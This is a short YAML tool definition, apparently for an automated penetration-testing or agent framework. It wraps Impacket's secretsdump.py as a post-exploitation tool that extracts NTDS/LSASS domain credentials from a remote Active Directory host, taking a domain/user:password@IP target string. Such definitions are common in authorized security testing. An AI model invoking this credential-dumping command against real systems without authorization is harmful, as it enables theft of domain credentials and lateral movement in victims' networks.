name: impacket_secretsdump
description: Impacket secretsdump 凭证提取工具，从远程目标提取 NTDS/LSASS 等凭证
command: "secretsdump.py {target} -just-dc-user {user} 2>/dev/null"
category: post_exploit
timeout: 300
tags: [credentials, dump, activedirectory, post_exploit]
parameters:
  - name: target
    type: string
    required: true
    description: 目标连接字符串，如 domain/user:password@192.168.1.1
  - name: user
    type: string
    required: false
    description: 指定提取的域用户名，不指定则提取全部
